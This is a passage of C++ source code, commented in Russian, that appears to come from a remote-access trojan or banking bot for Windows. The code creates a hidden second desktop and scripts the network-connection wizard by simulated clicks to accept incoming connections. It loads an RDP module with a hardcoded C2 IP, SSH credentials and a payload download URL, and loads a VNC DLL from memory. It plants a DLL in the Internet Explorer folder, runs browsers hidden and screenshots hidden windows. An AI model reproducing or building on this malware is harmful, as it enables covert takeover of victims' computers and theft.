	memset(pRasConn, 0, sizeof(RASCONNW));
	pRasConn->dwSize = 52;	// минимальная версия - подходит везде и содержит нужные данные
	err = RasEnumConnectionsW(pRasConn, &dwBufferSize, &dwCount);
	if(err == ERROR_SUCCESS && dwCount == 0)
	{
		free(pRasConn);
		*result = 2;
		return 0;
	}
	//err = RasEnumConnectionsW(NULL, &dwBufferSize, NULL);
	if(err != ERROR_BUFFER_TOO_SMALL && err != ERROR_SUCCESS)
	{
		free(pRasConn);
		return err;
	}
	else if(err == ERROR_BUFFER_TOO_SMALL)
	{
		pRasConn = (LPRASCONNW)realloc(pRasConn, dwBufferSize);
		// Получаем все соединения
		err = RasEnumConnectionsW(pRasConn, &dwBufferSize, &dwCount);
		if(err != ERROR_SUCCESS)
		{
			free(pRasConn);
			return err;
		}
	}


	// Поиск соединения ХХХ
	LPRASCONNW XXX = NULL;
	for(int i=0; i<dwCount; i++)
	{
		LPRASCONNW elem = pRasConn + i;
		if(wcscmp(&elem->szEntryName[0], L"XXX") == 0) {
			XXX = elem;
			break;
		}
	}

	// Нужное соединение не найдено
	if(XXX == NULL)
	{
		free(pRasConn);
		return -1;
	}

	// Получаем статус интересующего соединения
	LPRASCONNSTATUSW lpRasConnStatus = new RASCONNSTATUSW();
	memset(lpRasConnStatus, 0, sizeof(RASCONNSTATUSW));
	lpRasConnStatus->dwSize = sizeof(RASCONNSTATUSW);
	err = RasGetConnectStatus(XXX->hrasconn, lpRasConnStatus);
	if(err != ERROR_SUCCESS)
	{
		free(pRasConn);
		delete(lpRasConnStatus);
		return err;
	}

	*result = (lpRasConnStatus->rasconnstate == RASCS_Connected) ? 1 : 0;

	free(pRasConn);
	delete(lpRasConnStatus);

	return 0;
}

DWORD VPNStop()
{
	DWORD err = 0;
	DWORD dwBufferSize = 0;
	DWORD dwCount = 0;

	// Получаем необходимый размер буффера для списка соедидений
	LPRASCONNW pRasConn = (LPRASCONNW)malloc(sizeof(RASCONNW));
	memset(pRasConn, 0, sizeof(RASCONNW));
	pRasConn->dwSize = 52;	// минимальная версия - подходит везде и содержит нужные данные
	err = RasEnumConnectionsW(pRasConn, &dwBufferSize, &dwCount);
	if(err == ERROR_SUCCESS && dwCount == 0)
	{
		free(pRasConn);
		return -1;
	}

	if(err != ERROR_BUFFER_TOO_SMALL && err != ERROR_SUCCESS)
	{
		free(pRasConn);
		return err;
	}
	else if(err == ERROR_BUFFER_TOO_SMALL)
	{
		pRasConn = (LPRASCONNW)realloc(pRasConn, dwBufferSize);
		// Получаем все соединения
		err = RasEnumConnectionsW(pRasConn, &dwBufferSize, &dwCount);
		if(err != ERROR_SUCCESS)
		{
			free(pRasConn);
			return err;
		}
	}

	// Поиск соединения ХХХ
	LPRASCONNW XXX = NULL;
	for(int i=0; i<dwCount; i++)
	{
		LPRASCONNW elem = pRasConn + i;
		if(wcscmp(&elem->szEntryName[0], L"XXX") == 0) {
			XXX = elem;
			break;
		}
	}

	// Нужное соединение не найдено
	if(XXX == NULL)
	{
		free(pRasConn);
		return -1;
	}

	return RasHangUp(XXX->hrasconn);
}
/*
bool VPNStop()
{
	TCHAR sPathWStr[1024] = L"";
	STARTUPINFOA si;
	ZeroMemory( &si, sizeof(si) );
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow =SW_HIDE;//SW_SHOWMINNOACTIVE  SW_HIDE  SW_MAXIMIZE  SW_HIDE...
	if(CurDesk == Second) si.lpDesktop = SECOND_DESK_NAMEA;
	//si.lpDesktop = "SecondDesktop";

	PROCESS_INFORMATION pi;
	ZeroMemory( &pi, sizeof(pi) );

	//system("rasdial XXX pptp pptp");
	if( CreateProcessA( NULL, "rasdial XXX /DISCONNECT", 0, 0, 1, 0, 0, 0, &si, &pi ) )
	{
	}
	return false;
}
*/

typedef DWORD (*importRasGetEntryPropertiesW) (LPCWSTR, LPCWSTR, tagRASENTRYW*, LPDWORD, LPBYTE, LPDWORD);
importRasGetEntryPropertiesW RasGetEntryPropertiesW2;

typedef DWORD (*importRasSetEntryPropertiesW) (LPCWSTR, LPCWSTR, tagRASENTRYW*, DWORD, LPBYTE, DWORD);
importRasSetEntryPropertiesW RasSetEntryPropertiesW2;

DWORD CreateVPN(WCHAR* ip)
{

	HMODULE hLib = LoadLibraryA("rasapi32.dll");
	RasGetEntryPropertiesW2 = (importRasGetEntryPropertiesW)GetProcAddress(hLib, "RasGetEntryPropertiesW");
	RasSetEntryPropertiesW2 = (importRasSetEntryPropertiesW)GetProcAddress(hLib, "RasSetEntryPropertiesW");

	DWORD dwSize = 0;
	RasGetEntryPropertiesW2(NULL, L"", NULL, &dwSize, NULL, NULL);
	/*WCHAR buf[100] = {0};
	wsprintfW(&buf[0], L"CreateVPN: dwSize = %d", dwSize);
	//MessageBoxW(NULL, &buf[0], L"", 0);
	//OutputDebugStringW(&buf[0]);*/


	LPRASENTRYW RE = (LPRASENTRY) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);
	//RE = (LPRASENTRYW)malloc(sizeof(RASENTRYW));
	DWORD err = GetLastError();

	memset(RE, 0, dwSize);
	//int i = sizeof(RASENTRYW);
	//int j = sizeof(*RE);
	RE->dwSize = dwSize;
	RE->dwfOptions =  RASEO_Custom + RASEO_PreviewUserPw + RASEO_ShowDialingProgress;
	//RE->dwCountryID = 7;
	//RE->dwCountryCode = 7;
	wcscpy(&RE->szLocalPhoneNumber[0], ip);
	wcscpy(&RE->szAreaCode[0], L"");
	RE->dwfNetProtocols = RASNP_Ip;
	RE->ipaddr.a = 95;
	RE->ipaddr.b = 168;
	RE->ipaddr.c = 173;
	RE->ipaddr.d = 155;
	RE->dwFramingProtocol = RASFP_Ppp;
	wcscpy(&RE->szDeviceType[0], L"vpn");
	wcscpy(&RE->szDeviceName[0], L"WAN Miniport (PPTP)");

	DWORD res = RasSetEntryPropertiesW2(NULL, L"XXX", RE, dwSize, NULL, 0);

	if (RE != NULL ) {
        HeapFree(GetProcessHeap(), 0, (LPVOID)RE);
    }

	FreeLibrary(hLib);

	return res;
}

DWORD WINAPI ClientStartRDP_Dll1( LPVOID lpThreadParameter )
{



	WCHAR * SysPath= (WCHAR *)lpThreadParameter;


	HMODULE Lib= LoadLibraryW(SysPath);

	typedef int (WINAPIV* PINIT) (char* config);
	typedef int (WINAPIV* PSTART)();
	typedef int (WINAPIV* PSTOP)();
	typedef int (WINAPIV* PTakeBotGuid)(char*boot_guid);



	PINIT Init				= (PINIT)GetProcAddress( Lib, "Init" );
	PSTART Start			= (PSTART)GetProcAddress( Lib, "Start" );
	PSTOP Stop				= (PSTOP)GetProcAddress( Lib, "Stop" );
	PTakeBotGuid TakeBotGuid= (PTakeBotGuid)GetProcAddress( Lib, "TakeBotGuid" );


			  //'88.198.53.14;22;445;sshu;P@ssw0rd;system_help;fixer;http://www.cushyhost.com/download.php?img=73'
	char*ip   = "88.198.53.14;22;445;sshu;P@ssw0rd;system_help;fixerESCONuendoZ;http://www.cushyhost.com/download.php?img=73";


	int i=Init(ip);
	int w=Start();
	while ( 1 )// ждем команды на выключение
	{
		HANDLE tmp;
		tmp= (HANDLE)OpenMutexA(MUTEX_ALL_ACCESS,false, "DllStop");
		if ((DWORD)WaitForSingleObject(tmp, INFINITE))
		{
			Sleep(100);
		}
		else break;
	}
	int r=Stop();
	FreeLibrary(Lib);

	return 0;

}

typedef struct VNCSTR
{
	SOCKET s;
	byte* B;
};
DWORD StartVNC(LPBYTE param)
{

	//VNCSTR *data=(VNCSTR *)param;

	HMEMORYMODULE hLib = MemoryLoadLibrary(param );
	if (hLib==NULL)
	{
		return 0;
	}

	typedef VOID (WINAPI* PSTART)();
	typedef VOID (WINAPI* PSTOP)();



	PSTART Start			= (PSTART)MemoryGetProcAddress( hLib,"_VNC_Start@0" );
	PSTOP Stop				= (PSTOP )MemoryGetProcAddress( hLib,"_VNC_Stop@0" );


	Start();
	while ( 1 )// ждем команды на выключение
	{
		HANDLE tmp;
		tmp= (HANDLE)OpenMutexA(MUTEX_ALL_ACCESS,false, "ANCStop");
		if ((DWORD)WaitForSingleObject(tmp, INFINITE))
		{
			Sleep(100);
		}
		else break;
	}
	Stop();
	MemoryFreeLibrary(hLib);

	return 0;
}

void VPNManualeThread(WCHAR*Ip)
{
	HANDLE hThr = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)CreateVPNDialog, (LPVOID)Ip, NULL, 0);

}

void run()
{
	SHELLEXECUTEINFO info={0};

    info.fMask        = SEE_MASK_NOCLOSEPROCESS ;
    info.lpFile       = L"rundll32.exe";
	info.lpParameters = L"netshell.dll,StartNCW";
    info.nShow        = SW_SHOW;

    int i =ERROR_ACCESS_DENIED ;;

    ShellExecuteEx( &info );

    i = GetLastError();

    WaitForSingleObject( info.hProcess, INFINITE );
    CloseHandle( info.hProcess );
}


DWORD CreateVPNDialog(LPVOID send_params)
//bool CreateVPNDialog(WCHAR*ip)
{
	// run();
	//	 return 0;
	HDESK hSecondDesktop=CreateDesktopW(SECOND_DESK_NAME,NULL,NULL,DF_ALLOWOTHERACCOUNTHOOK,GENERIC_ALL,NULL);
	BOOL res = SetThreadDesktop(hSecondDesktop);
	if(!res)
	{
		DWORD err = GetLastError();
		DbgMsgW(L"file", err, L"SetThreadDesktop ERROR");
	}

	WCHAR*ip=(WCHAR*)send_params;
	TCHAR sPathWStr[1024] = L"";
	int x = GetSystemMetrics( SM_CXSCREEN );
	int y = GetSystemMetrics( SM_CYSCREEN );
	STARTUPINFOA si;
	ZeroMemory( &si, sizeof(si) );
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;//SW_SHOWMINNOACTIVE  SW_HIDE  SW_MAXIMIZE  SW_HIDE...
	si.dwX=x-20;
	si.dwY=0;
	si.dwXSize=x;
	si.dwYSize=y;
	si.lpDesktop = SECOND_DESK_NAMEA;

	PROCESS_INFORMATION pi;
	ZeroMemory( &pi, sizeof(pi) );

	//if(PatchTermSrvMain() != 0) return false;
	if( CreateProcessA( NULL, "control.exe NETCONNECTIONS", 0, 0, 1, 0, 0, 0, &si, &pi ) )//cmd /C C:\\vpn_xxx.vbs
	{
		Sleep(5000);
		while (!(hWnd_newConnection=FindWindow(NULL,L"Мастер новых подключений")))
		{
			Sleep(50);
		}


		if(hWnd_newConnection != NULL)
		{
		//	ClickedControl(hWnd_newConnection,71,163,false,0,0,false);//далее
			Sleep(1000);
			ClickedControl(hWnd_newConnection,360,360,false,0,0,false);//далее
			Sleep(1000);
			ClickedControl(hWnd_newConnection,154,161,false,0,0,false);//прямое подключение
			Sleep(1000);
			ClickedControl(hWnd_newConnection,360,360,false,0,0,false);//далее
			Sleep(1000);
			ClickedControl(hWnd_newConnection,146,213,false,0,0,false);//принимать входящие
			Sleep(1000);
			ClickedControl(hWnd_newConnection,360,360,false,0,0,false);//далее
			Sleep(1000);
			WindowKeys((DWORD_PTR)hWnd_newConnection,62,150,L"XXX",false,false,false);
			Sleep(1000);
			ClickedControl(hWnd_newConnection,360,360,false,0,0,false);//далее
			//WindowKeys((DWORD_PTR)hWnd_newConnection,62,150,L"",true,false,false);
			Sleep(1000);
			WindowKeys((DWORD_PTR)hWnd_newConnection,62,150,ip,false,false,false);
			Sleep(1000);
			ClickedControl(hWnd_newConnection,360,360,false,0,0,false);//далее
			Sleep(1000);
			ClickedControl(hWnd_newConnection,360,360,false,0,0,false);//далее
			return true;
		}
	}
	DWORD err = GetLastError();
	return false;
}

TCHAR sPathDll[1024] = L"";
bool RunIE( CClientContext *pContext, TCHAR* cInput,TCHAR* cExe, DWORD dwHost, BOOL sw_shell, BOOL sw_run_withIE)
{

	if (sw_run_withIE)
	{
		RunNewIE(cInput, cExe,  sw_shell);
	}
	else
	{
		TCHAR sPathWStr[1024] = L"";
		if (sw_shell)
		{
			int x = GetSystemMetrics( SM_CXSCREEN );
			int y = GetSystemMetrics( SM_CYSCREEN );
			STARTUPINFO si;
			ZeroMemory( &si, sizeof(si) );
			si.cb = sizeof(si);
			si.dwFlags = STARTF_USESHOWWINDOW;
			si.wShowWindow =dwHost;//SW_SHOWMINNOACTIVE  SW_HIDE  SW_MAXIMIZE  SW_HIDE...
			si.dwX=x-20;
			si.dwY=0;
			si.dwXSize=x-10;
			si.dwYSize=y-10;
			if(GetCurDesk() == Second)
				si.lpDesktop = SECOND_DESK_NAME;

			PROCESS_INFORMATION pi;
			ZeroMemory( &pi, sizeof(pi) );

			ZeroMemory( &sPathWStr, sizeof(1024) );
			if (cExe[0]=='\0')
			{
				SHGetFolderPath(NULL, CSIDL_PROGRAM_FILES, NULL, SHGFP_TYPE_CURRENT, sPathWStr);
				lstrcat( sPathWStr, L"\\Internet Explorer\\iexplore.exe " );
			}
			else
			{
				wcscpy(&sPathWStr[0],cExe);
				lstrcat( sPathWStr, L" " );

			}
			lstrcat( sPathWStr, cInput );

			if( CreateProcess( 0, sPathWStr, 0, 0, 1, 0, 0, 0, &si, &pi ) )
			{}

		}
		else
		{
			if (cExe[0]=='\0')
			{
				SHGetFolderPath(NULL, CSIDL_PROGRAM_FILES, NULL, SHGFP_TYPE_CURRENT, sPathWStr);
				lstrcat( sPathWStr, L"\\Internet Explorer\\iexplore.exe " );
			}
			else
			{
				wcscpy(&sPathWStr[0],cExe);
			}
			ShellExecute(0,L"open",sPathWStr,cInput,0,dwHost);
		}
	}
	bool bResult = false;

	TCHAR sPath[1024] = L"";
	SHGetFolderPath(NULL, CSIDL_PROGRAM_FILES, NULL, SHGFP_TYPE_CURRENT, sPath);
	wcscpy(&sPathDll[0],&sPath[0]);
	lstrcat( sPathDll, L"\\Internet Explorer\\msacm32.dll" );
	CopyDll(true,sPathDll);
	bResult = true;
	return bResult;
}

bool RunNewFF( TCHAR* cInput,TCHAR* cExe, BOOL sw_shell )
{
	TCHAR sPathWStr[1024] = L"";
	if (cExe[0]=='\0')
	{
		SHGetFolderPath(NULL, CSIDL_PROGRAM_FILES, NULL, SHGFP_TYPE_CURRENT, sPathWStr);
		lstrcat( sPathWStr, L"\\Mozilla Firefox\\firefox.exe " );
	}
	else
	{
		wcscpy(&sPathWStr[0],cExe);
	}
	if (cInput[0]=='\0')
	{
		cInput=L" ";

	}
	TCHAR sPath[1024] = L"";

	SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, sPath);
	DbgMsgW(sPath,1,L"");
	lstrcat( sPath, L"\\ff.dat" );
	HANDLE hFile = (HANDLE)CreateFileW( sPath, GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0 );

	if (hFile==INVALID_HANDLE_VALUE)
		DbgMsgW(sPath,GetLastError(),L"");
	DWORD dwSiseFile;
	DWORD dwBytes;

	if (sw_shell)
	{
		if (!WriteFile(hFile,L"!",2,&dwBytes,NULL))
		{
			OutputDebugStringA("WriteFile error");
		}
	}

	int t =wcslen(&sPathWStr[0])*2;
	if (!WriteFile(hFile,&sPathWStr[0],t,&dwBytes,NULL))
	{
		OutputDebugStringA("WriteFile error");
	}
	if (!WriteFile(hFile,L" ",2,&dwBytes,NULL))
	{
		OutputDebugStringA("WriteFile error");
	}
	if (!WriteFile(hFile,L" -new-window ",26,&dwBytes,NULL))
	{
		OutputDebugStringA("WriteFile error");
	}
	t =wcslen(cInput)*2+1;
	if (!WriteFile(hFile,cInput,t,&dwBytes,NULL))
	{
		OutputDebugStringA("WriteFile error");
	}
	CloseHandle(hFile);

	HANDLE mHahd= CreateMutexA(NULL,false,"CrMFF");
	if (mHahd==NULL)OutputDebugStringA("CreateMutexA error");
	Sleep(4000);
	CloseHandle(mHahd);
	return true;
}

bool RunFF( CClientContext *pContext, TCHAR* cInput, TCHAR* cExe, DWORD dwHost, BOOL sw_shell, BOOL sw_run_withIE)
{

	if (sw_run_withIE)
	{
		RunNewFF(cInput, cExe,  sw_shell);
	}
	else
	{
		TCHAR sPathWStr[1024] = L"";
		if (sw_shell)
		{
			int x = GetSystemMetrics( SM_CXSCREEN );
			int y = GetSystemMetrics( SM_CYSCREEN );
			STARTUPINFO si;
			ZeroMemory( &si, sizeof(si) );
			si.cb = sizeof(si);
			si.dwFlags = STARTF_USESHOWWINDOW;
			si.wShowWindow =dwHost;//SW_SHOWMINNOACTIVE  SW_HIDE  SW_MAXIMIZE  SW_HIDE...
			si.dwX=x-20;
			si.dwY=0;
			si.dwXSize=x-10;
			si.dwYSize=y-10;
			if(GetCurDesk() == Second) si.lpDesktop = SECOND_DESK_NAME;

			PROCESS_INFORMATION pi;
			ZeroMemory( &pi, sizeof(pi) );

			ZeroMemory( &sPathWStr, sizeof(1024) );
			if (cExe[0]=='\0')
			{
				SHGetFolderPath(NULL, CSIDL_PROGRAM_FILES, NULL, SHGFP_TYPE_CURRENT, sPathWStr);
				lstrcat( sPathWStr, L"\\Mozilla Firefox\\firefox.exe -new-window " );
			}
			else
			{
				wcscpy(&sPathWStr[0],cExe);
				lstrcat( sPathWStr, L" " );

			}
			lstrcat( sPathWStr, cInput );

			if( CreateProcess( 0, sPathWStr, 0, 0, 1, 0, 0, 0, &si, &pi ) )
			{}

		}
		else
		{
			if (cExe[0]=='\0')
			{
				SHGetFolderPath(NULL, CSIDL_PROGRAM_FILES, NULL, SHGFP_TYPE_CURRENT, sPathWStr);
				lstrcat( sPathWStr, L"\\Mozilla Firefox\\firefox.exe " );

			}
			else
			{
				wcscpy(&sPathWStr[0],cExe);
			}
			TCHAR cInputNew[512];
			wcscpy(&cInputNew[0], L"-new-window ");
			wcscat(&cInputNew[0], &cInput[0]);
			ShellExecute(0,L"open",sPathWStr,cInputNew,0,dwHost);
		}
	}
	bool bResult = false;

	/*TCHAR sPath[1024] = L"";
	SHGetFolderPath(NULL, CSIDL_PROGRAM_FILES, NULL, SHGFP_TYPE_CURRENT, sPath);
	wcscpy(&sPathDll[0],&sPath[0]);
	lstrcat( sPathDll, L"\\Internet Explorer\\msacm32.dll" );
	CopyDll(true,sPathDll);
	bResult = true;*/
	return bResult;
}

struct stackTag
{
	HWND element;
	stackTag *next;
} ;
stackTag *Record=NULL;

void Add(HWND  Nod)
{
	stackTag * tmpStack=Record;
	if (Record==NULL)
	{
		Record=new(stackTag);
		Record->element=Nod;
		Record->next=NULL;
	}
	else
	while(true)
	{
		if (tmpStack->next!=NULL)
			tmpStack=tmpStack->next;
		else
		{
			tmpStack->next=new(stackTag);
			tmpStack->next->element=Nod;
			tmpStack->next->next=NULL;
			break;
		}
	}
}
bool ExsistsIn(HWND  Nod)
{
	stackTag * tmpStack=Record;
	if (tmpStack==NULL)
	{
		return false;
	}
	else
	{
		while(true)
		{
			if (tmpStack->element == Nod )
			{
				return true;
			}
			else
			{
				if(tmpStack->next == NULL )
				{
					return false;
				}
				else
				{
					tmpStack=tmpStack->next;
				}
			}
		}

	}
}

void DellAll()
{
	stackTag * tmpStack=Record;
	while (true)
	{
		if (tmpStack==NULL)
		{
			return;
		}
		else
		{
			Record=tmpStack->next;
			delete(tmpStack);
			tmpStack=Record;

		}
	}
}



byte *lpImage=0;
int  dwSize=0;

#pragma optimize("",off)
byte* WINAPI GetOurAddr(int dwTmpVal=0)
{
    return (byte*)*((((int*)&dwTmpVal)-1));
}
#pragma optimize("",on)

PIMAGE_SECTION_HEADER GetCodeSect()
{
    dwSize=((PIMAGE_OPTIONAL_HEADER)((lpImage)+
             ((PIMAGE_DOS_HEADER)(lpImage))->e_lfanew+sizeof(DWORD)+
             sizeof(IMAGE_FILE_HEADER)))->SizeOfImage;

    PIMAGE_FILE_HEADER pfh=(PIMAGE_FILE_HEADER)((DWORD)lpImage+((PIMAGE_DOS_HEADER) lpImage)->e_lfanew+sizeof(DWORD));
    PIMAGE_OPTIONAL_HEADER poh=(PIMAGE_OPTIONAL_HEADER)(pfh+1);
    PIMAGE_SECTION_HEADER psh=(PIMAGE_SECTION_HEADER)((DWORD)poh+sizeof(IMAGE_OPTIONAL_HEADER));

    int dwAddr=(int) GetOurAddr()-(int)lpImage;
    for (int i=0; i<pfh->NumberOfSections; i++)
    {
        if (dwAddr-psh[i].VirtualAddress < psh[i].Misc.VirtualSize)
            return &psh[i];
    }

    return 0;
}

byte *GetBase()
{
    byte *lpImg=(byte *)((int)GetOurAddr() & 0xFFFFF000);
    WORD tmp='ZM' ^ 0x3030;
    tmp^=0x3030;

    for (;; lpImg-=0x1000)
    {
        if (*(WORD*)lpImg == tmp)
        {
            tmp='EP' ^ 0x3030;
            tmp^=0x3030;
            if (*(WORD*)&lpImg[((PIMAGE_DOS_HEADER)lpImg)->e_lfanew] == tmp)
                return lpImg;
        }
    }
}

bool sw_resize_dir = false;
bool CreateScreenshotBMP( HWND hw, BYTE **data, DWORD *size, int iSleep,BOOL isDelFile,bool MoveWind,bool HiseSecDesc )
{
	if(((HiseSecDesc) || (GetCurDesk() == First)))
	if (!IsWindowVisible(hw))
	{
		if (!ExsistsIn(hw))
		{
			SetLayeredWindowAttributes(hw, 0, 1, LWA_ALPHA);
			SetWindowPos(hw, HWND_BOTTOM, 0, 0, 0, 0, SWP_SHOWWINDOW | SWP_NOACTIVATE | SWP_NOMOVE | SWP_NOSIZE);
		///	ShowWindow(hw, SW_MAXIMIZE);
			int x = GetSystemMetrics( SM_CXSCREEN );
			int y = GetSystemMetrics( SM_CYSCREEN );
			WCHAR classname[MAX_PATH];
			GetClassName(hw, &classname[0], 256);
			if(wcscmp(&classname[0], L"SunAwtFrame") == 0 ||
			   wcscmp(&classname[0], L"SunAwtDialog") == 0||
			   wcscmp(&classname[0], L"#32770") == 0)
			{
				RECT  tmp;
				GetWindowRect(hw,&tmp);
				SetWindowPos(hw, HWND_BOTTOM, (int)(x-10), (int)10,  (int)(tmp.right - tmp.left), (int)(tmp.bottom - tmp.top), SWP_NOACTIVATE );
			//	DbgMsg
				//MoveWindow(hw,x-20, 10, tmp.right - tmp.left, tmp.bottom - tmp.top,true);

			}
			else
			{
				MoveWindow(hw,x+10, 0, x-20, y-20,true);
			}
/**/
			Add(hw);
		}
		SetWindowPos(hw, HWND_BOTTOM, 0, 0, 100, 100, SWP_SHOWWINDOW | SWP_NOACTIVATE | SWP_NOMOVE | SWP_NOSIZE);
		Sleep(iSleep);
		SetWindowPos(hw, HWND_BOTTOM, 0, 0, 100, 100, SWP_HIDEWINDOW | SWP_NOACTIVATE | SWP_NOMOVE | SWP_NOSIZE);
		SetWindowLong(hw, GWL_EXSTYLE, GetWindowLong(hw, GWL_EXSTYLE) | WS_EX_TOOLWINDOW) ;
		SetWindowLong(hw, GWL_EXSTYLE, GetWindowLong(hw, GWL_EXSTYLE) | WS_EX_LAYERED );

	}

	if (isDelFile)
	{
		TCHAR sPath[MAX_PATH] = L"";
		SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, sPath);
		lstrcat( sPath, L"\\ie.dat" );
		DeleteFile(sPath);
	}
	RECT rcCurrent;
	if( hw == 0 )
	{
		rcCurrent.left = rcCurrent.top = 0;
		rcCurrent.right = GetSystemMetrics( SM_CXSCREEN );
		rcCurrent.bottom = GetSystemMetrics( SM_CYSCREEN );
	}
	else
	{
		WINDOWPLACEMENT wp;
		ZeroMemory( &wp, sizeof(wp) );
		wp.length = sizeof(wp);
		GetWindowPlacement( hw, &wp );
		GetWindowRect( hw, &rcCurrent );
	}
	DWORD dx = rcCurrent.right - rcCurrent.left;
	DWORD dy = rcCurrent.bottom - rcCurrent.top;

	HDC hdc = GetDC( 0 );
	HDC hdcmem = CreateCompatibleDC( hdc );
	HBITMAP hbm = CreateCompatibleBitmap( hdc, dx, dy );
	HBITMAP hbmOld = (HBITMAP)SelectObject( hdcmem, hbm );

	bool sw_java = false;
	if(IsJavaWindow(hw))
	{
		sw_java = true;
		RECT  tmp;
		GetWindowRect(hw,&tmp);
		if(sw_resize_dir)
			MoveWindow(hw, tmp.left, tmp.top, tmp.right-tmp.left-1, tmp.bottom-tmp.top, true);
		else
			MoveWindow(hw, tmp.left, tmp.top, tmp.right-tmp.left+1, tmp.bottom-tmp.top, true);
		sw_resize_dir=!sw_resize_dir;
	}

	OSVERSIONINFO osvi={0};
    osvi.dwOSVersionInfoSize=sizeof(osvi);
    GetVersionEx(&osvi);
    bXP=(osvi.dwMajorVersion <= 5);

    if (bXP)
    {
        lpImage=GetBase();
        GetCodeSect();
    }
	if( hw == 0 )
	{
		if(GetCurDesk() == Second)
		{
			MakeScreenShotParams param;
			param.hWnd = hw;
			param.hDC_res = hdcmem;
			param.W = dx;
			param.H = dy;
			HANDLE hThr = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MakeScreenShotWrapper, &param, 0, NULL);
			WaitForSingleObject(hThr, -1);
			CloseHandle(hThr);
			//MakeScreenShot(hw, hdcmem, &dx, &dy);
		}
		else
			BitBlt( hdcmem, 0, 0, dx, dy, hdc, 0, 0, SRCCOPY );
	}
	else
	{
		if(GetCurDesk() == Second)
		{
			if(!IsJavaWindow(hw))
			{
				WCHAR classname[MAX_PATH];
				GetClassName(hw, &classname[0], 256);
				if(wcscmp(&classname[0], L"Shell_TrayWnd") != 0 )
				{
					if (HiseSecDesc)

					SetWindowPos(hw, HWND_BOTTOM, 0, 0, 100, 100, SWP_SHOWWINDOW |  SWP_NOSIZE);
				}
			}

			RECT  tmp;
			GetWindowRect(hw,&tmp);
			if(sw_resize_dir)
				MoveWindow(hw, tmp.left, tmp.top, tmp.right-tmp.left-1, tmp.bottom-tmp.top, true);
			else
				MoveWindow(hw, tmp.left, tmp.top, tmp.right-tmp.left+1, tmp.bottom-tmp.top, true);/**/
			sw_resize_dir=!sw_resize_dir;

			Sleep(iSleep);
			MakeScreenShot(hw, hdcmem, &dx, &dy);
			if(!IsJavaWindow(hw))
			{
				WCHAR classname[MAX_PATH];
				GetClassName(hw, &classname[0], 256);
				if(wcscmp(&classname[0], L"Shell_TrayWnd") != 0	)
				{
					if (HiseSecDesc)
					SetWindowPos(hw, HWND_BOTTOM, 0, 0, 100, 100, SWP_HIDEWINDOW |  SWP_NOSIZE);
				}
			}
		}
		else
		{
			bool IsHideWind=false;
			if (!IsWindowVisible(hw))
			{
				IsHideWind=true;
				SetWindowPos(hw, HWND_BOTTOM, 0, 0, 100, 100, SWP_SHOWWINDOW | SWP_NOACTIVATE | SWP_NOMOVE | SWP_NOSIZE);
			}
			Sleep(iSleep);
			PrintWindow( hw, hdcmem, 0 );
			if (IsHideWind)
				SetWindowPos(hw, HWND_BOTTOM, 0, 0, 100, 100, SWP_HIDEWINDOW | SWP_NOACTIVATE | SWP_NOMOVE | SWP_NOSIZE);
		}

	}

	SelectObject( hdcmem, hbmOld );

	DWORD sz =
		sizeof(WIN_SHOT) +
		sizeof(BITMAPFILEHEADER) +
		sizeof(BITMAPINFOHEADER) +
		((dx*3+3)&0xFFFFFFFC)*dy;

	BYTE *buffer = (BYTE *)malloc(sz);
	ZeroMemory( buffer, sz );

	WIN_SHOT *shot = (WIN_SHOT *)buffer;
	BITMAPFILEHEADER *bmfh = (BITMAPFILEHEADER *)(buffer + sizeof(WIN_SHOT));
	BITMAPINFOHEADER *bmih = (BITMAPINFOHEADER *)(buffer + sizeof(BITMAPFILEHEADER) + sizeof(WIN_SHOT));
	BYTE *dib = buffer + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + sizeof(WIN_SHOT);

	shot->compression = 1;
	shot->id = (DWORD_PTR)hw;
	shot->imagelength = sz - sizeof(WIN_SHOT);

	bmfh->bfType = 0x4D42;
	bmfh->bfSize = sizeof(BITMAPFILEHEADER) + sz;
	bmfh->bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

	bmih->biSize = sizeof(BITMAPINFOHEADER);
	bmih->biWidth = dx;
	bmih->biHeight = dy;
	bmih->biPlanes = 1;
	bmih->biBitCount = 24;
	bmih->biCompression = BI_RGB;

	GetDIBits( hdcmem, hbm, 0, dy, dib, (BITMAPINFO*)bmih, DIB_RGB_COLORS );

	DeleteDC( hdcmem );
	DeleteObject( hbm );
	ReleaseDC( 0, hdc );

	*size = sz;
	*data = buffer;

	return true;
}

bool FindJPEGCodec( CLSID& clsIdCodec )
{
	bool bCodecFound = false;
	clsIdCodec = GUID_NULL;

	UINT uNum = 0, uSize = 0;
	if( GetImageEncodersSize( &uNum, &uSize ) != Ok )
	{
		return false;
	}

	ImageCodecInfo *pCodecInfo = (ImageCodecInfo *)malloc(uSize);
	if( !pCodecInfo )
	{
		return false;
	}

	GetImageEncoders( uNum, uSize, pCodecInfo );

	for( UINT i=0; i<uNum; i++ )
	{
		if( lstrcmpW( pCodecInfo[i].MimeType, L"image/jpeg" ) == 0 )
		{
			clsIdCodec = pCodecInfo[i].Clsid;
			bCodecFound = true;
			break;
		}
	}

	free( pCodecInfo );
	return bCodecFound;
}


bool ConvertToJPEG( BYTE **data, DWORD *size, BYTE *dataBMP, DWORD sizeBMP )
{
	CLSID clsIdCodec = GUID_NULL;
	if( !FindJPEGCodec( clsIdCodec ) )
	{
		return false;
	}

	BITMAPINFO *pInfo = (BITMAPINFO *)( dataBMP + sizeof(WIN_SHOT) + sizeof(BITMAPFILEHEADER) );
	BYTE *pBits = dataBMP + sizeof(WIN_SHOT) + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
	Bitmap SrcBitmap( pInfo, pBits );

	bool bOk = false;
	IStream *pStream = 0;
	if( CreateStreamOnHGlobal( 0, TRUE, &pStream ) == S_OK )
	{
		if( SrcBitmap.Save( pStream, &clsIdCodec, 0 ) == Ok )
		{
			LARGE_INTEGER lOfs;
			ULARGE_INTEGER lSize;
